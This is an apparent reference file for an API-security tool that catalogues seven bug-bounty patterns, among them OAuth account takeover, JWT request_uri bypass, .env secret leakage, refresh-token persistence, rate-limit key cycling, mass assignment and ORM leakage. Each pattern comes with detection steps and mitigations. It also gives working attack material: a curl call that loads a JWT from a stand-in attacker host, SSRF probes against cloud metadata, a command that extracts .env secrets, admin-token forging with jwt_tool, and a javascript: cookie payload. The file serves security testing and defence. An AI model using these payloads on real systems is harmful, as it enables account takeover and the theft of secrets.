# Bug Bounty Patterns 2024-2026 — api-security

## Overview

Post-2023 public bug-bounty techniques curated from HackerOne Hacktivity, PortSwigger
"Top 10 Web Hacking Techniques" 2024 & 2025, Google VRP 2024/2025, Doyensec OAuth
research, Akamai SOTI 2025, Deepstrike, Auth0, and RFC 9700 (OAuth 2.0 Security BCP).
Last validated: 2026-04. Emit findings via `../schemas/finding.json`.

## Pattern Index

| #  | Pattern                                              | Severity | Primary Source                                      |
|----|------------------------------------------------------|----------|-----------------------------------------------------|
| P1 | OAuth Non-Happy-Path Account Takeover                | Critical | PortSwigger Top 10 2024 (Oxrz)                      |
| P2 | JWT Validation Bypass via `request_uri`              | Critical | CVE-2024-10318 · Doyensec 2025                      |
| P3 | .env-Leaked JWT_SECRET → `alg:none` + open-redirect  | Critical | HackerOne disclosures 2025                          |
| P4 | Refresh-Token Silent Persistence Post-Compromise     | Critical | RFC 9700 (2025) · Auth0 blog                        |
| P5 | Per-Key Rate-Limit Bypass via Token Cycling          | High     | Akamai SOTI Report 2025                             |
| P6 | Mass-Assignment Privilege Escalation                 | Critical | CVE-2025-15602 (Snipe-IT) · Deepstrike 2025         |
| PB | ORM Data Leakage via JOIN / filter abuse             | High     | PortSwigger Top 10 2025                             |

---

## Patterns

### P1. OAuth Non-Happy-Path Account Takeover

- **CVE / Source:** PortSwigger "Top 10 Web Hacking Techniques 2024" — research by Oxrz; mirrored in multiple HackerOne ATO writeups 2024-2025.
- **Summary:** Error paths, abandoned flows, and header-mutated state/code parameters in OAuth implementations are rarely tested; tampering in those paths yields account takeover without ever touching the canonical callback.
- **Affected surface:** `/oauth/authorize`, `/oauth/callback`, `/auth/link`, IdP-side `state`/`code` parameters, PKCE code_verifier, `Origin`/`Referer`-gated trust boundaries.
- **Detection (automated):**
  - Crawl every OAuth endpoint with 3 variants: success path, denied-consent path, aborted path.
  - Inject CRLF, double-encoded delimiters, and second-order values into `state`, `code`, `redirect_uri`, `scope`.
  - Diff response bodies/status per flow; flag any handler that accepts partial state or re-uses `code`.
  - Check for missing PKCE validation: replay the authorization `code` with a different `code_verifier` and observe whether a token is still issued.
  - Inspect frontend bundles for client secrets (`grep -Ei "client_secret|oauth.*secret"` in built JS).
- **Exploitation / PoC:**
  ```http
  GET /oauth/callback?code=ATTACKER_CODE&state=VICTIM_STATE HTTP/1.1
  Host: target.tld
  Origin: https://target.tld.attacker.tld
  Referer: https://target.tld/settings/link?next=/admin
  ```
  Combine with an abandoned-consent redirect that leaves a linkable session on the attacker's browser.
- **Indicators:** OAuth token issued without matching PKCE verifier; `state` replayed across users; `Origin` host mismatch but request accepted.
- **Mitigation:** Enforce PKCE S256 on every client; single-use `state` bound to server session; reject mismatched `Origin`/`Referer`; short-lived `code` with idempotency key.
- **Cross-refs:** CWE-384, CWE-639; OWASP API Top 10 API2:2023; related → P2, P4; see `payloads/jwt_attacks.txt`.

### P2. JWT Validation Bypass via `request_uri`

- **CVE / Source:** CVE-2024-10318 (NGINX OIDC reference implementation); Doyensec "OAuth Common Vulnerabilities" (Jan 2025).
- **Summary:** OIDC endpoints that accept the `request_uri` JAR parameter fetch an attacker-controlled JWT whose nonce/redirect_uri/scope claims override the on-wire query string, yielding token reuse and session fixation.
- **Affected surface:** `/authorize` with `request_uri=`, `/.well-known/openid-configuration`, JAR/PAR endpoints.
- **Detection (automated):**
  ```bash
  curl -s "https://idp.target/authorize?client_id=X&request_uri=https://attacker.tld/jwt.jwt"
  ```
  - Host a JWT at `attacker.tld/jwt.jwt` signed with an attacker key or `alg:none`.
  - If the IdP issues a code/token the JAR signature is not being enforced.
  - Fuzz `request_uri` with SSRF variants (`file://`, `http://169.254.169.254/`, `gopher://`).
- **Exploitation / PoC:**
  ```json
  // JWT hosted at attacker-controlled request_uri
  { "iss":"attacker","aud":"idp","client_id":"victim","redirect_uri":"https://attacker.tld/cb",
    "response_type":"code","scope":"openid profile email","nonce":"FIXED","state":"ATTACKER" }
  ```
- **Indicators:** IdP logs show `request_uri` fetched from arbitrary host; JWT `iss` not matching registered client; nonce reuse across sessions.
- **Mitigation:** Require PAR (pushed authorization requests); allow-list `request_uri` domains; enforce JWT signature against registered JWKS; pin `aud` to IdP URL.
- **Cross-refs:** CWE-347, CWE-345; OIDC Core §6; RFC 9126 (PAR); related → P1.

### P3. .env-Leaked JWT_SECRET → `alg:none` + Open-Redirect Chain

- **CVE / Source:** Multiple HackerOne disclosures 2025 (chain write-ups by `truffleHog-style` recon + token forging).
- **Summary:** Misconfigured web servers expose `.env`, `.git/config`, or `.env.example`; extracted `JWT_SECRET` is used to forge admin tokens, and an open redirect on the app delivers the forged cookie cross-origin.
- **Affected surface:** Backup files (`.env`, `.env.bak`, `backup.zip`, `dump.sql`), verbose `/_errors`, exposed `.git/`, open redirects in `?next=`/`?return_to=`/`?url=`.
- **Detection (automated):**
  - Probe the standard exposure list: `/.env`, `/.env.example`, `/.env.local`, `/.env.prod`, `/.git/config`, `/config.php.bak`, `/wp-config.php.swp`.
  - Use `trufflehog`/`gitleaks` against exposed `.git`.
  - Crack discovered JWTs with `jwt_tool -C -d` using leaked secret.
  - Enumerate open-redirect params with `OpenRedireX`.
- **Exploitation / PoC:**
  ```bash
  curl -fsSL https://target.tld/.env | grep -E 'JWT_SECRET|SECRET_KEY'
  # Forge admin token:
  jwt_tool -S hs256 -p "$LEAKED_SECRET" -I -pc role -pv admin -pc sub -pv 1 "$EXISTING_JWT"
  # Deliver via open redirect:
  https://target.tld/login/callback?next=javascript:document.cookie='jwt='+FORGED
  ```
- **Indicators:** 200 on `/.env`; JWT with unexpected `role=admin` from unusual IP; redirect target set to `javascript:` or cross-origin.
- **Mitigation:** Deny dotfiles at the reverse proxy; rotate any secret ever committed; restrict redirects to allow-list; short `exp` + server-side revocation list.
- **Cross-refs:** CWE-200, CWE-601, CWE-798; `payloads/jwt_attacks.txt` (append adds matching vectors).

### P4. Refresh-Token Silent Persistence Post-Compromise

- **CVE / Source:** RFC 9700 OAuth 2.0 Security BCP (Jan 2025); Auth0 security blog 2025.
- **Summary:** Applications revoke access tokens on password reset but leave refresh tokens valid indefinitely; stolen refresh tokens continue minting access tokens and bypass MFA re-prompts.
- **Affected surface:** `/oauth/token?grant_type=refresh_token`, mobile SDK token storage, localStorage-stored refresh tokens.
- **Detection (automated):**
  - Capture an RT, trigger password reset / MFA enrollment / session revoke, replay RT → `grant_type=refresh_token`.
  - Replay RT ≥10 times; flag if rotation is absent (same RT still valid).
  - Grep web bundles for `refresh_token` in `localStorage.setItem` / IndexedDB.
- **Exploitation / PoC:**
  ```bash
  curl -X POST https://api.target/oauth/token \
    -d grant_type=refresh_token -d refresh_token="$STOLEN_RT" -d client_id=$CID
  # Expect: fresh access_token issued despite post-reset session.
  ```
- **Indicators:** Single RT reused across IPs/UAs; RT issuance not followed by rotation; token use after user-visible "sign out everywhere".
- **Mitigation:** RT rotation (RFC 6749 §10.4); bind RT to device+session; revoke all RTs on password reset; sender-constrain via DPoP / mTLS.
- **Cross-refs:** CWE-613, CWE-384; OAuth 2.1 §4.14; related → P1.

### P5. Per-Key Rate-Limit Bypass via Token Cycling

- **CVE / Source:** Akamai SOTI Report 2025 — 61% of API attacks observed use key cycling; APISec research 2025.
- **Summary:** Rate limiting keyed per API token rather than per user/IP lets attackers cycle through many free-tier/test/trial keys (or stolen keys) to achieve aggregate unlimited throughput.
- **Affected surface:** Public API gateways, LLM inference APIs, SMS/email providers, any `/v*/...` endpoint rate-limited by header `Authorization`/`X-API-Key`.
- **Detection (automated):**
  - Enumerate the signup flow: script creation of N burner accounts, harvest N API keys.
  - Fire requests across all keys at low per-key velocity, high aggregate RPS; observe whether user-level, account-level, or billing-level throttling trips.
  - Fuzz identity headers (`X-Forwarded-For`, `CF-Connecting-IP`) between keys.
- **Exploitation / PoC:**
  ```bash
  for k in $(cat harvested_keys.txt); do
    curl -sS -H "Authorization: Bearer $k" https://api.target/v1/expensive-endpoint &
  done
  ```
- **Indicators:** Burst of low-volume requests from many fresh keys against the same high-cost endpoint; billing anomalies.
- **Mitigation:** Rate-limit per *billing entity* and per source-IP cluster, not per key; captcha + phone verification on signup; heuristic detection of parallel low-velocity keys.
- **Cross-refs:** CWE-770, CWE-837; OWASP API4:2023.

### P6. Mass-Assignment Privilege Escalation

- **CVE / Source:** CVE-2025-15602 (Snipe-IT, CVSS 8.8); Deepstrike mass-assignment guide 2025; repeated HackerOne reports 2024-2025.
- **Summary:** `PUT /users/{id}` / `PATCH /profile` endpoints bind the entire request body to the ORM model, letting low-privilege users set `role`, `is_admin`, `org_id`, `owner_id`, `permissions[]` fields.
- **Affected surface:** CRUD endpoints backed by Django/Rails/Laravel/Spring model binding, GraphQL mutations with loose `input` types.
- **Detection (automated):**
  - Diff `GET /users/{id}` response fields vs. accepted `PATCH` body fields.
  - Enumerate candidate restricted fields: `role`, `roles`, `is_admin`, `is_staff`, `permissions`, `org_id`, `owner_id`, `verified`, `email_verified`, `plan`, `credits`, `balance`.
  - Send PATCH as low-priv user with each candidate; diff server state via GET.
- **Exploitation / PoC:**
  ```http
  PATCH /api/users/self HTTP/1.1
  Content-Type: application/json

  {"display_name":"x","role":"super_admin","permissions":["*"]}
  ```
- **Indicators:** Admin-only field changed without admin-only endpoint invocation; audit log shows role change from non-admin principal.
- **Mitigation:** Explicit allow-list of bindable fields (DRF `fields`, Rails `strong_parameters`, Laravel `$fillable` with care); server-side role check before persist; separate admin endpoints.
- **Cross-refs:** CWE-915; OWASP API6:2023; related → `payloads/mass_assignment.txt`.

### PB. ORM Data Leakage via JOIN / filter abuse

- **CVE / Source:** PortSwigger "Top 10 Web Hacking Techniques 2025" — universal ORM leak methodology.
- **Summary:** Server-side ORM query builders (Hasura, PostgREST, Prisma, Spring Data REST) expose `filter`/`where`/`order_by` DSLs that allow JOINs across relations the user shouldn't traverse, leaking adjacent table contents through boolean-timing or projection-error oracle.
- **Affected surface:** `GET /v1/items?filter[owner.email][like]=%`, GraphQL `where: { owner: { email: { _like: "%" } } }`, PostgREST `?select=*,related(*)`.
- **Detection (automated):**
  - Probe filter DSL with relation names (`owner`, `org`, `parent`, `creator`, `uploader`).
  - Use boolean-based oracles: compare response size/timing across `filter[owner.email][like]=a%` vs `b%`.
  - Enumerate GraphQL with introspection → auto-generate reachable JOIN chains.
- **Exploitation / PoC:**
  ```http
  GET /api/notes?filter[author.email][starts_with]=admin@ HTTP/1.1
  ```
  Binary-search the first N characters of every admin email.
- **Indicators:** Filter DSL accepts relation names not in documented schema; response-size varies monotonically with filter prefix.
- **Mitigation:** Restrict filterable paths via allow-list; apply row-level security; block boolean-timing oracles with constant-time responses.
- **Cross-refs:** CWE-200, CWE-639; OWASP API3:2023.

---

## Cross-skill links
- SAST: see `../../sast-orchestration/references/bounty_patterns_2024_2026.md` (ORM leakage rule authoring).
- DAST: see `../../dast-automation/references/bounty_patterns_2024_2026.md` (cache-deception chains that amplify OAuth/JWT bugs).
- LLM: refresh-token leak via LLM logs — see `../../llm-security/references/bounty_patterns_2024_2026.md` (P7).
